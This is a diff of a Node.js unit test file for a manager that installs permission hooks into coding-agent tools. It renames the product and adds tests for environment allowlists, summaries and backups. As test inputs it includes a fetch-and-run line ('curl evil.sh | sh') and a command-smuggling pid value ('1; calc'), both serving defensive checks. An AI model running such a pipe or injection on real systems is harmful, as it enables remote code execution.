@@ -1,7 +1,7 @@
 "use strict";
 
 // AgentsManager unit tests against a FAKE installer (test/fixtures/fake-installer.cjs). Temp dirs only:
-// the real ~/.claude, ~/.codex and ~/.abito-island are never touched.
+// the real ~/.claude, ~/.codex and ~/.koda are never touched.
 
 const test = require("node:test");
 const assert = require("node:assert/strict");
@@ -9,29 +9,38 @@ const fs = require("node:fs");
 const os = require("node:os");
 const path = require("node:path");
 
+const { spawnSync } = require("node:child_process");
 const { AgentsManager } = require("../src/agents.cjs");
 const { win, unixOnly } = require("./platform-env.cjs");
 
 const FIXTURE = path.join(__dirname, "fixtures", "fake-installer.cjs");
-// macOS injects __CF_USER_TEXT_ENCODING into every process at exec (CoreFoundation); the fake
-// installer records its own process.env, so on darwin this key appears although the product passed
-// an allowlisted env. It is OS-injected and never comes from the parent environment — not a leak.
-const OS_INJECTED_ENV = [
-	...(process.platform === "darwin" ? ["__CF_USER_TEXT_ENCODING"] : []),
-	// Windows: the OS adds the user-profile pair HOMEDRIVE/HOMEPATH to a spawned child's environment
-	// beyond the explicit env block (observed on the Windows CI runner, CI 41729969464 test 60: the
-	// recorded child env carries HOMEDRIVE although the product passes the closed childEnv allowlist).
-	// They are OS-injected profile facts, never parent secrets; the env OPTION the product passes stays
-	// asserted closed by the HU-047 run-seam tests, which record exactly what the product handed over.
-	...(win ? ["HOMEDRIVE", "HOMEPATH"] : []),
-];
+/**
+ * The keys a process gets BEYOND the env block it was handed, asked to this same OS instead of being listed by hand.
+ * The fake installer records its own process.env, so the OS-injected keys show up in what it recorded even though the
+ * product passed an allowlisted env: Windows adds profile and system facts (HOMEDRIVE/HOMEPATH, LOGONSERVER,
+ * SYSTEMDRIVE, SYSTEMROOT, ...) and darwin adds __CF_USER_TEXT_ENCODING at exec (CoreFoundation). Adding those names one
+ * CI failure at a time is a treadmill (CI 41729969464, 43263659882, 43319173068 each added one) and a hand-written list is
+ * always one runner image behind, so the set is DERIVED: this Node is spawned once with a single marker variable and the
+ * keys that come back are exactly what the OS injects. It stays non-tautological: a leaked marker of the parent (a real
+ * variable the product did not pass) is in neither the pinned set nor this one, so the leak assertion still fails.
+ */
+const ENV_PROBE_KEY = "KODA_ENV_PROBE";
+const OS_INJECTED_ENV = (() => {
+	const probe = spawnSync(process.execPath, ["-e", "process.stdout.write(JSON.stringify(Object.keys(process.env)))"], {
+		env: { [ENV_PROBE_KEY]: "1" }, encoding: "utf8", timeout: 60_000, windowsHide: true,
+	});
+	if (probe.status !== 0 || typeof probe.stdout !== "string") throw new Error(`env probe failed: ${probe.status} ${probe.stderr ?? probe.error ?? ""}`);
+	const keys = JSON.parse(probe.stdout);
+	if (!Array.isArray(keys) || !keys.includes(ENV_PROBE_KEY)) throw new Error("env probe did not report its own marker");
+	return keys.filter((key) => key !== ENV_PROBE_KEY);
+})();
 const HASH_A = "a".repeat(64);
 const HASH_B = "b".repeat(64);
 const HASH_R = "c".repeat(64);
 const SCHEMA = "abito-hook-install/1";
 
 function preview({ harness = "claude", action = "install", ops = ["add", "add"], changed, hash = HASH_A, hidden = 0, lines = ["@@ -1 +1 @@", "+ x"], target } = {}) {
-	const file = { claude: "settings.json", copilot: "abito-island.json", opencode: "abito-island.js" }[harness] ?? "hooks.json";
+	const file = { claude: "settings.json", copilot: "koda-island.json", opencode: "koda-island.js" }[harness] ?? "hooks.json";
 	const dir = { claude: ".claude", copilot: ".copilot/hooks", opencode: ".config/opencode/plugins" }[harness] ?? ".codex";
 	return {
 		schema: SCHEMA,
@@ -193,7 +202,7 @@ for (const [id, events] of [['statusline', ['statusLine']]]) {
   assert.deepEqual(call.argv, [s.installerBin, 'install', id, '--user', '--json']);
   // The recorded child env is each platform's own closed allowlist: POSIX PATH+HOME (+LANG), the Windows
   // SystemRoot-shaped env with USERPROFILE (the product's HU-047 contract, asserted the same way above).
-  const allowedEnv = win ? ['HOME', 'USERPROFILE', 'SystemRoot', 'PATH', 'LANG', 'ABITO_ISLAND_EXE'] : ['PATH', 'HOME', 'LANG', 'ABITO_ISLAND_EXE'];
+  const allowedEnv = win ? ['HOME', 'USERPROFILE', 'SystemRoot', 'PATH', 'LANG', 'KODA_ISLAND_EXE'] : ['PATH', 'HOME', 'LANG', 'KODA_ISLAND_EXE'];
   assert.ok(Object.keys(call.env).every(k => allowedEnv.includes(k)));
   await assert.rejects(s.manager.connect(id), e => e.code === 'bad_request');
   for (const entries of [events.slice(1).map(event => ({ event, op: 'add' })), events.map(event => ({ event, op: 'execute' })), events.map(() => ({ event: 'PermissionRequest', op: 'add' }))]) {
@@ -313,7 +322,7 @@ test("state mapping: not_connected with plan_hash and closed summaries", async (
 	assert.equal(claude.trust_review, false);
 	const codex = byId(list, "codex");
 	assert.equal(codex.plan_hash, HASH_B);
-	assert.equal(codex.summary, "Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.");
+	assert.equal(codex.summary, "Adds the Abito hooks (PermissionRequest, Stop) to ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.");
 	assert.equal(codex.trust_review, true);
 	assert.equal(byId(list, "opencode").state, "unavailable", "no OpenCode settings dir in the private HOME: not installed");
 	assert.equal(byId(list, "copilot-cli").state, "unavailable");
@@ -328,7 +337,7 @@ test("state mapping: connected has no plan fields; replace and mixed ops are out
 	for (const k of ["plan_hash", "summary", "reviewable", "trust_review"]) assert.equal(k in claude, false, k);
 	const codex = byId(list, "codex");
 	assert.equal(codex.state, "outdated");
-	assert.equal(codex.summary, "Updates the Abito hooks in ~/.codex/hooks.json. A backup is made first. Codex will ask you to trust them in /hooks.");
+	assert.equal(codex.summary, "Updates the Abito hooks in ~/.codex/hooks.json. A backup is made first. Koda answers Codex permission requests from the island; Codex waits up to 120 s for your answer. Trust the Koda hooks again in Codex /hooks after every install or update.");
 	assert.equal(codex.plan_hash, HASH_A);
 	s.write({ claude: { preview: { exit: 0, stdout: preview({ ops: ["add", "keep"] }) } }, codex: { preview: { exit: 0, stdout: preview({ harness: "codex" }) } } });
 	s.manager.invalidate();
@@ -431,13 +440,13 @@ test("K2-02 (S2): the Node that runs the installer leads its PATH, so a bare `no
 	assert.ok(calls.length >= 1, "the installer ran through the bundled node");
 	for (const call of calls) {
 		assert.equal(call.env.PATH, `${runtimeDir}:/usr/bin:/bin`);
-		assert.equal(call.env.ABITO_ISLAND_EXE, fs.realpathSync(nodeExe), "hooks are written with the bundled node path (new installs)");
+		assert.equal(call.env.KODA_ISLAND_EXE, fs.realpathSync(nodeExe), "hooks are written with the bundled node path (new installs)");
 	}
 });
 
-test("child env: allowlist + ABITO_ISLAND_EXE only, HOME is the real home passed in", async (t) => {
+test("child env: allowlist + KODA_ISLAND_EXE only, HOME is the real home passed in", async (t) => {
 	const s = setup(t, { claude: { preview: { exit: 0, stdout: preview() } }, codex: { preview: { exit: 0, stdout: preview({ harness: "codex" }) } } });
-	const names = ["PI_SESSION_ID", "OPENAI_API_KEY", "CLAUDECODE", "CODEX_THREAD_ID", "GENTLE_PI_SESSION", "ABITO_SOCKET_DIR"];
+	const names = ["PI_SESSION_ID", "OPENAI_API_KEY", "CLAUDECODE", "CODEX_THREAD_ID", "GENTLE_PI_SESSION", "KODA_SOCKET_DIR"];
 	const saved = Object.fromEntries(names.map((k) => [k, process.env[k]]));
 	for (const k of names) process.env[k] = "leak-value";
 	try {
@@ -450,11 +459,11 @@ test("child env: allowlist + ABITO_ISLAND_EXE only, HOME is the real home passed
 	}
 	assert.equal(s.calls().length, 6);
 	// The product allowlist is DERIVED from src/agents.cjs childEnv (never guessed): what the manager
-	// passes is exactly childEnv(), plus the OS-injected keys above (the real spawn's child process
-	// environment carries them on Windows; the injected-run HU-047 tests pin the option itself).
+	// passes is exactly childEnv(), plus the keys this OS injects into a child on its own (OS_INJECTED_ENV asks the OS;
+	// it is never a hand-written list of names, and the injected-run HU-047 tests pin the env OPTION itself).
 	// Review (non-tautological): the CLOSED set is pinned here as literals per OS. A key added to childEnv() itself must
 	// fail this test, not widen it; the derived set must equal the pinned one, and the recorded child env stays inside it.
-	const PINNED_ENV = (win ? ["HOME", "USERPROFILE", "SystemRoot", "PATH", "ABITO_ISLAND_EXE"] : ["PATH", "HOME", "ABITO_ISLAND_EXE"]).concat(process.env.LANG ? ["LANG"] : []);
+	const PINNED_ENV = (win ? ["HOME", "USERPROFILE", "SystemRoot", "PATH", "KODA_ISLAND_EXE"] : ["PATH", "HOME", "KODA_ISLAND_EXE"]).concat(process.env.LANG ? ["LANG"] : []);
 	assert.deepEqual(Object.keys(s.manager.childEnv()).sort(), [...PINNED_ENV].sort(), "the product's child env is exactly the pinned closed set");
 	const allowedEnv = [...PINNED_ENV, ...OS_INJECTED_ENV];
 	for (const call of s.calls()) {
@@ -466,7 +475,7 @@ test("child env: allowlist + ABITO_ISLAND_EXE only, HOME is the real home passed
 		} else {
 			assert.equal(call.env.PATH, `${path.dirname(process.execPath)}:/usr/bin:/bin`, "the Node that runs the installer leads PATH (K2-02)");
 		}
-		assert.equal(call.env.ABITO_ISLAND_EXE, fs.realpathSync(process.execPath));
+		assert.equal(call.env.KODA_ISLAND_EXE, fs.realpathSync(process.execPath));
 		assert.equal(call.ppid, process.pid, "direct child of the daemon process");
 	}
 });
@@ -510,6 +519,21 @@ test("HU-047: an unsafe folder keeps its own detail with the folder and the clos
 	assert.deepEqual([b.detail, b.folder], ["unsafe_folder", undefined], "an unknown reason never forwards the folder");
 });
 
+test("HU-047: a folder that does not exist reads 'unavailable', never an unsafe-folder error", async (t) => {
+	// Windows (CI 43319173068 tests 44/46): the native helper reports parent_ok=false when the parent directory is absent,
+	// so a tool that is simply NOT INSTALLED there is refused as unsafe_folder and the manager showed state 'error'. A
+	// folder that does not exist cannot be unsafe, so the honest answer is the one POSIX already gave ('refused' with no
+	// settings directory => unavailable). A refusal about an EXISTING folder keeps its error, folder and reason.
+	const unsafe = { exit: 65, stdout: { schema: SCHEMA, ok: false, code: "unsafe_folder", message: "fixed", folder: "/home/u/.config/opencode/plugins", folder_reason: "acl" } };
+	const s = setup(t, { opencode: { preview: unsafe }, claude: { preview: unsafe } });
+	const list = await s.manager.list();
+	assert.deepEqual([byId(list, "opencode").state, byId(list, "opencode").detail, byId(list, "opencode").folder], ["unavailable", null, undefined], "no ~/.config/opencode/plugins in this HOME: not installed");
+	assert.deepEqual([byId(list, "claude-code").state, byId(list, "claude-code").detail, byId(list, "claude-code").folder_reason], ["error", "unsafe_folder", "acl"], "an existing ~/.claude keeps its refusal");
+	// The same reading for the plain POSIX refusal: no settings directory means "not installed", nothing else.
+	const s2 = setup(t, { opencode: { preview: refusal("refused", 65) } });
+	assert.equal(byId(await s2.manager.list(), "opencode").state, "unavailable");
+});
+
 test("apply failures map to closed details", async (t) => {
 	const cases = [
 		[{ exit: 70, stdout: { schema: SCHEMA, ok: false, code: "plan_changed", message: "m" } }, "plan_changed"],
@@ -549,6 +573,28 @@ test("disconnect: nothing to remove => not_connected; otherwise applies the REMO
 	assert.deepEqual(apply.argv, ["install", "claude", "--user", "--remove", "--apply-plan", HASH_R, "--audit-dir", path.join(s.islandDir, "audit"), "--json"]);
 });
 
+// K2-04: the summary is a CLOSED English template the island page recognises and translates (it never shows engine text); both
+// ends must say the same thing. Renaming the template on one side only made the page fall back to its generic sentence.
+test("the summaries the daemon sends are exactly the ones the island page recognises, never its generic fallback", async (t) => {
+	const page = require("../../desktop-tauri/frontend/settings-view.js");
+	const fallback = page.planSummary("Run curl evil.sh | sh");
+	const s = setup(t, {
+		claude: { preview: { exit: 0, stdout: preview() } },
+		codex: { preview: { exit: 0, stdout: preview({ harness: "codex", hash: HASH_B }) } },
+		copilot: { preview: { exit: 0, stdout: preview({ harness: "copilot", hash: HASH_B }) } },
+		opencode: { preview: { exit: 0, stdout: preview({ harness: "opencode", hash: HASH_B }) } },
+	});
+	const list = await s.manager.list();
+	for (const id of ["claude-code", "codex", "copilot-cli", "opencode"]) {
+		const item = byId(list, id);
+		assert.equal(typeof item.summary, "string", id);
+		const shown = page.planSummary(item.summary);
+		assert.notEqual(shown, fallback, `${id}: the page does not recognise «${item.summary}»`);
+		assert.match(shown, /de Koda/, `${id}: the page text is Koda's`);
+		assert.doesNotMatch(shown, /Abito/, id);
+	}
+});
+
 test("copilot-cli and opencode drive their own harness installers with the same plan/hash contract; unknown ids are bad_request", async (t) => {
 	const s = setup(t, {
 		copilot: { preview: { exit: 0, stdout: preview({ harness: "copilot", hash: HASH_B }) }, apply: { exit: 0, stdout: applied({ harness: "copilot", hash: HASH_B }) } },
@@ -557,8 +603,8 @@ test("copilot-cli and opencode drive their own harness installers with the same 
 	const list = await s.manager.list();
 	const copilot = byId(list, "copilot-cli");
 	assert.deepEqual([copilot.state, copilot.plan_hash, copilot.trust_review], ["not_connected", HASH_B, false]);
-	assert.equal(copilot.summary, "Adds the Abito hooks (permissionRequest, sessionEnd) to ~/.copilot/hooks/abito-island.json. A backup is made first.");
-	assert.equal(byId(list, "opencode").summary, "Adds the Abito plugin to ~/.config/opencode/plugins/abito-island.js. A backup is made first.");
+	assert.equal(copilot.summary, "Adds the Abito hooks (permissionRequest, sessionEnd) to ~/.copilot/hooks/koda-island.json. A backup is made first.");
+	assert.equal(byId(list, "opencode").summary, "Adds the Abito plugin to ~/.config/opencode/plugins/koda-island.js. A backup is made first.");
 	await assert.rejects(s.manager.connect("copilot-cli", undefined).then(() => s.manager.connect("copilot-cli", "zz")), (e) => e.code === "bad_request");
 	const done = byId(await s.manager.connect("copilot-cli", HASH_B), "copilot-cli");
 	assert.equal(done.state, "connected");
@@ -632,7 +678,7 @@ test("installer trust check: group-writable or symlinked script is refused befor
 	assert.equal(s.calls().length, 0);
 });
 
-test("a pending migration (old Abito PreToolUse entry to remove, every wire row keep) is outdated, not an error", async (t) => {
+test("a pending migration (old Koda PreToolUse entry to remove, every wire row keep) is outdated, not an error", async (t) => {
 	const json = preview({ ops: ["keep", "keep"], changed: true });
 	json.entries.push({ event: "PreToolUse", op: "remove" });
 	const s = setup(t, { claude: { preview: { exit: 0, stdout: json } } });
@@ -653,4 +699,34 @@ test("HU-047 L4: a timed-out installer is killed as a TREE on Windows (taskkill 
 	for (const bad of [[{ pid: 4 }, "win32"], [{ pid: "1; calc" }, "win32"], [null, "win32"], [{ pid: 4321 }, "linux"], [{ pid: 4321 }, "darwin"]]) killTree(bad[0], bad[1], run);
 	assert.equal(calls.length, 1, "never for a bogus pid or off Windows (POSIX uses the process group)");
 	assert.doesNotThrow(() => killTree({ pid: 4321 }, "win32", () => { throw new Error("x"); }));
+});
+
+// K2-04 (S2, S4): the installer retires the Koda 0.1 artifact into the same backup flow, so an agent whose only backup comes
+// from the 0.1 file/dir must still report it (and the file names Ajustes names are the ones Koda installs today).
+test("K2-04: a backup of the Koda 0.1 artifact counts as this agent's backup", async (t) => {
+	const layout = {
+		claude: [path.join(".claude", "settings.json"), null],
+		codex: [path.join(".codex", "hooks.json"), null],
+		statusline: [path.join(".claude", "settings.json"), [{ event: "statusLine", op: "add" }]],
+		copilot: [path.join(".copilot/hooks", "koda-island.json"), null],
+		opencode: [path.join(".config/opencode/plugins", "koda-island.js"), null],
+		pi: [path.join(".pi/agent/extensions", "koda-island"), [{ event: "extension", op: "add" }]],
+	};
+	const s = setup(t, {}, { run: async (argv) => {
+		const harness = argv[2];
+		const [rel, entries] = layout[harness];
+		const body = preview({ harness, ops: ["add", "add"], target: path.join(s.home, rel) });
+		if (entries) body.entries = entries;
+		return { exit: 0, stdout: Buffer.from(JSON.stringify(body)) };
+	} });
+	// A 0.1 backup beats no backup at all: the file sits next to the Copilot target, the folder in the Pi backup root.
+	fs.mkdirSync(path.join(s.home, ".copilot/hooks"), { recursive: true });
+	fs.writeFileSync(path.join(s.home, ".copilot/hooks", "abito-island.json.abito-backup-2026-01-02T03-04-05-000Z"), "{}");
+	fs.mkdirSync(path.join(s.home, ".pi/agent/abito-backups"), { recursive: true });
+	fs.mkdirSync(path.join(s.home, ".pi/agent/abito-backups", "abito-island.abito-backup-2026-01-02T03-04-05-000Z"));
+	const list = await s.manager.list();
+	assert.equal(byId(list, "copilot-cli").backup, true, "a 0.1 backup next to the target counts");
+	assert.equal(byId(list, "pi").backup, true, "a 0.1 extension backup in the backup root counts");
+	assert.equal(byId(list, "opencode").backup, false, "an unrelated agent keeps its honest false");
+	for (const agent of ["copilot-cli", "pi", "opencode"]) assert.notEqual(byId(list, agent).state, "error");
 });
